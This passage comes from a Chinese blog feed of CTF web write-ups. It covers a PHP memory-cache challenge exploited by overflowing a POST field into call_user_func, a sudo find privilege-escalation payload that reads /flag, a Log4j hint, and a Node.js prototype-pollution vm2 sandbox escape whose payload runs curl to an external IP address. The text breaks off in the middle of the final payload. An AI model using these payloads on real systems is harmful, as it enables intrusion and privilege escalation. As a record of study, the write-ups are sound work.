<span class="variable">$cursor</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ref_table</span>=[];</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">neaten</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;ctfshow&#x27;</span>)===<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;flag&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fill</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]+<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;\x00&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">neaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_clear_&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;\C::clear&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x36d</span>,<span class="string">&#x27;Q&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNeaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]+<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">4</span>));</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">12</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>));</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkRef</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;v&quot;</span>,<span class="variable">$size</span>));</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="number">0x31</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$ref</span>,<span class="variable">$this</span>-&gt;ref_table))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref not exists!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seekCursor</span>(<span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$cref</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">20</span>);</span><br><span class="line">        <span class="variable">$csize</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">2</span>));</span><br><span class="line">        <span class="variable">$usize</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$csize</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$val</span>,<span class="variable">$fmt</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="variable">$fmt</span>,<span class="variable">$val</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;cursor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">truncation</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$data</span>),function(<span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$var</span>!==<span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seekCursor</span>(<span class="params"><span class="variable">$cursor</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$cursor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkRef</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>)&gt;<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Refenerce size too long!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$r</span>[<span class="number">0</span>]) || <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$r</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkByte</span>(<span class="params"><span class="variable">$check</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_5</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_2</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_3</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;= <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_4</span> </span><br><span class="line">            &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) !== <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_6</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://memory&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNeaten</span>();</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">main</span>();</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>写入post值得时候没限制长度，所以可以覆盖后面的flag和<em>clear</em>存储的值，然后最后读<em>clear</em>时候调用了call_user_func</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;easy-signin&quot;&gt;&lt;a href=&quot;#easy-signin&quot; class=&quot;headerlink&quot; title=&quot;easy_signin&quot;&gt;&lt;/a&gt;easy_signin&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/imag</summary>
      
    
    
    
    
    <category term="ctfshow 愚人杯" scheme="https://ke1nys.github.io/tags/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>杭师校赛决赛-web</title>
    <link href="https://ke1nys.github.io/posts/a14faaa5.html"/>
    <id>https://ke1nys.github.io/posts/a14faaa5.html</id>
    <published>2023-04-03T12:58:59.000Z</published>
    <updated>2023-04-06T06:48:36.162Z</updated>
    
    <content type="html"><![CDATA[<p>决赛wp ————&gt;    <a href="https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&amp;mid=2247484079&amp;idx=1&amp;sn=74a1712eb4cbf5c905ea80e92cf03c1c&amp;chksm=cf3a76eaf84dfffcb0e7af85b4c993b6b6e153cf17e55fffb7fc46d019d1b825fc40ceac009b&amp;mpshare=1&amp;scene=23&amp;srcid=0401jhF22ggclgHvClInRzbg&amp;sharer_sharetime=1680351746792&amp;sharer_shareid=ae0d082277f0323df022f55a1ded469f#rd&amp;ADUIN=599761980&amp;ADSESSION=1680348797&amp;ADTAG=CLIENT.QQ.5681_.0&amp;ADPUBNO=27272">wp</a></p><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>这题坑了我好久………..</p><p><strong>题目</strong></p><p><img src="../images/image-20230403210025913.png" alt="image-20230403210025913"></p><p><img src="../images/image-20230403210056248.png" alt="image-20230403210056248"></p><p>随便传了个值，发现是</p><p>报错  ——&gt;   在 $PATH 中找不到可执行文件</p><p>然后就猜测是不是得用/bin/xxx这种类型的格式来写</p><p><img src="../images/image-20230403210226676.png" alt="image-20230403210226676"></p><p>然后当时开心坏了，但是这个直接读不了，得需要提权，当时用了好多办法，都不行，因为很难，知道看到了wp才发现自己漏了关键一步…….</p><p>得这样写才行 ….    /usr/bin/xxxxx     哎   把/usr给漏了</p><p><strong>sudo提权</strong></p><p><img src="../images/image-20230403210610793.png" alt="image-20230403210610793"></p><p>先查看一下权限</p><p><img src="../images/image-20230403211014597.png" alt="image-20230403211014597"></p><p>提示了root权限的没有密码的/usr/bin/find能用</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo find /flag -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>不过学到了个提权方法   之前的是用date报错来提权拿到flag的</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>题目(hint  —- &gt;   Try to fxxk it ( Log4j     )</p><p><img src="../images/image-20230403212340457.png" alt="image-20230403212340457"></p><p><strong>考点</strong></p><p><strong>log4j+fastjson 远程开启LDAP服务</strong></p><h2 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h2><p>题目</p><p><img src="../images/image-20230403222934521.png" alt="image-20230403222934521"></p><p>就是去找一下源码</p><p><img src="../images/image-20230403223016892.png" alt="image-20230403223016892"></p><p>找到了源码，然后对源码进行分析</p><p><strong>源码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;star   t listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403223122388.png" alt="image-20230403223122388"></p><p>nodejs无非就是考原型链污染，这里开头看到了vm2</p><p>简单审计一下发现存在clone和merge两个方法配合，存在原型链污染漏洞。而引入了vm2模块且存在后门<code>new VM().run(&#123;&#125;.shellcode);</code> 很容易就想到结合原型链污染进行vm2沙箱逃逸 vm2沙箱逃逸</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="keyword">import</span>(<span class="string">&#x27;./app.js&#x27;</span>)</span><br><span class="line">res.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return this&quot;</span></span>)</span><br><span class="line">().<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;curl http://117.78.4.229:2333&quot;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure><p>这个app.js是源码    网上的exp大多输都是foo.js   </p><p>要注意区分</p><p>最终<strong>payload</strong></p><figure class="highlight javascript"><table><tr><td 